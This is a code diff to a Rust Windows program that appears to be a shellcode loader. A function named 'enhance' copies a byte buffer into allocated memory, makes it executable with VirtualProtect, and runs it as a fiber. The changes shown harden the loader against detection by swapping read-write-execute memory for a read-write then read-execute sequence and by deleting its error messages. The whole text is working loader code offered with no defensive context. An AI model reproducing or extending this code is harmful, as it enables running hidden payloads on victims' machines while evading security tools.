@@ -3,7 +3,7 @@
 
 use std::ptr::{null, null_mut};
 
-use windows_sys::Win32::{Foundation::GetLastError, System::{Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}, Threading::{
+use windows_sys::Win32::{System::{Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}, Threading::{
     ConvertThreadToFiber, CreateFiber, SwitchToFiber, LPFIBER_START_ROUTINE
 }}};
 
@@ -23,9 +23,9 @@ fn enhance(buf: Vec<u8>) {
         let alloc = VirtualAlloc(null(), buf.len(), MEM_COMMIT, PAGE_READWRITE);
         let alloc_ptr: *mut u8 = alloc as *mut u8;
         std::ptr::copy_nonoverlapping(buf.as_ptr(), alloc_ptr, buf.len());
-        let mut old_perms: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READWRITE;
+        let mut old_perms: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
         
-        VirtualProtect(alloc, buf.len(), PAGE_EXECUTE_READWRITE, &mut old_perms);
+        VirtualProtect(alloc, buf.len(), PAGE_EXECUTE_READ, &mut old_perms);
 
         let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(alloc_ptr);
 
@@ -38,10 +38,6 @@ fn enhance(buf: Vec<u8>) {
         );
 
         if buf_fiber_address.is_null() {
-            eprintln!(
-                "[!] CreateFiber Failed With Error: {}",
-                GetLastError()
-            );
             return;
         }
 
@@ -49,10 +45,6 @@ fn enhance(buf: Vec<u8>) {
 
         let primary_fiber_address = ConvertThreadToFiber(null_mut());
         if primary_fiber_address.is_null() {
-            eprintln!(
-                "[!] ConvertThreadToFiber Failed With Error: {}",
-                GetLastError()
-            );
             return;
         }
 
